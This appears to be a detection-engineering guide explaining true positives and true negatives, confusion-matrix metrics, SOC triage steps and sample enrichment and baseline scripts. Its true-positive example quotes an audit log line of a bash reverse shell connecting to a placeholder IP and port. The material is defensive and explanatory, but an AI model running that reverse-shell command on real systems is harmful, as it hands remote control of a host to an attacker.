# True Negative and True Positive

True positives and true negatives are the success states of a detection system. Maximizing both while minimizing false positives and false negatives is the core challenge of detection engineering.

---

## Definitions

| Outcome | Description |
| --- | --- |
| **True Positive (TP)** | A real attack correctly detected and alerted |
| **True Negative (TN)** | A legitimate action correctly identified as benign — no alert fired |
| **False Positive (FP)** | Legitimate action incorrectly flagged as malicious |
| **False Negative (FN)** | Real attack that was missed entirely |

---

## The Confusion Matrix in Security

```
                     ACTUAL
                  Attack | Benign
PREDICTED Attack |  TP   |  FP
          Benign |  FN   |  TN
```

A well-calibrated detection system maximizes the **TP** and **TN** quadrants.

---

## True Positive (TP)

A true positive confirms that a detection rule **correctly identified real attacker behavior**.

### Example — Detected Reverse Shell

```bash
# auditd catches bash spawned with stdin/stdout redirected to network socket
type=EXECVE msg=audit(1716540000.000:1234): argc=3 a0="bash" a1="-i" a2=">&/dev/tcp/10.0.0.1/4444"
```

The alert fires. Investigation confirms malicious activity. This is a **true positive** — the detection rule worked correctly.

### Confirming a TP

During triage, confirm the following before escalating:

```bash
# 1. Verify the parent process tree
ps -ef --forest | grep -A5 "suspicious_pid"

# 2. Check network connections established by the process
ss -tulpn | grep "suspicious_pid"

# 3. Check what files the process touched
lsof -p suspicious_pid

# 4. Correlate with authentication logs
grep "suspicious_user" /var/log/auth.log | tail -50
```

---

## True Negative (TN)

A true negative means the system **correctly did not alert** on a legitimate action. This is the expected steady-state of a well-tuned system.

### Example — Legitimate Admin Action Not Alerted

```bash
# Sysadmin runs routine package update — no alert fires
sudo apt-get update && sudo apt-get upgrade -y
```

No alert fires because the rule is scoped to exclude known-good maintenance commands. This is a **true negative** — the system correctly identified benign behavior.

### Validating TN Coverage

Run controlled benign actions after rule deployment and verify no alerts fire:

```bash
# Simulate normal web server behavior — should not trigger alerts
curl http://localhost/health
systemctl reload nginx
logrotate /etc/logrotate.d/nginx
```

If any of these fire alerts — investigate and add suppressions.

---

## Scoring Detection Effectiveness

### Key Metrics

```
Precision  = TP / (TP + FP)   → Alert accuracy
Recall     = TP / (TP + FN)   → Coverage of real attacks
Specificity = TN / (TN + FP)  → Correct rejection of benign events
F1 Score   = 2 × (P × R) / (P + R)
```

### Detection Quality Scoring Table

| Rule Quality | TP Rate | FP Rate | Assessment |
| --- | --- | --- | --- |
| Excellent | > 95% | < 2% | Production-ready |
| Good | 80–95% | 2–10% | Deploy with monitoring |
| Marginal | 50–80% | 10–30% | Needs tuning |
| Poor | < 50% | > 30% | Do not deploy |

---

## SOC Triage Workflow

When an alert fires, analysts follow a structured triage process to determine TP, FP, or unknown:

```
1. Alert received in SIEM/SOAR
2. Enrich alert:
   - Look up IP in threat intel (VirusTotal, AbuseIPDB)
   - Check user's recent activity timeline
   - Look for correlated alerts from same host/user
3. Classify:
   - Confirmed malicious → TP → Escalate to IR
   - Confirmed benign → FP → Suppress + document
   - Uncertain → Escalate to Tier 2
4. Document outcome in ticketing system
5. Feed outcome back to detection rule (tune threshold or add exclusion)
```

### Triage Decision Script

```bash
#!/bin/bash
# Quick enrichment for a suspicious IP
IP="$1"
echo "=== Threat Intel Lookup ==="
curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=${IP}" \
  -H "Key: YOUR_API_KEY" | jq '.data | {ip, abuseConfidenceScore, totalReports}'

echo "=== Recent Auth Attempts from ${IP} ==="
grep "${IP}" /var/log/auth.log | tail -20

echo "=== Active Connections from ${IP} ==="
ss -tn | grep "${IP}"
```

---

## Building Toward High-Fidelity Detection

High-fidelity detection systems combine:

1. **Baseline modeling** — learn what "normal" looks like per user, host, time
2. **Behavioral rules** — alert on deviation from baseline, not just signatures
3. **Correlation** — require multiple signals before alerting (reduces FP)
4. **Continuous feedback** — every FP drives rule refinement
5. **Purple team validation** — Red confirms every critical TP path is covered

```bash
# Example: baseline-aware detection
# Alert only if login occurs at unusual hour for this user
awk -v user="deploy" -v hour=$(date +%H) '
  $0 ~ "Accepted.*"user {
    if (hour < 8 || hour > 18) print "OFF-HOURS LOGIN: " $0
  }
' /var/log/auth.log
```

---
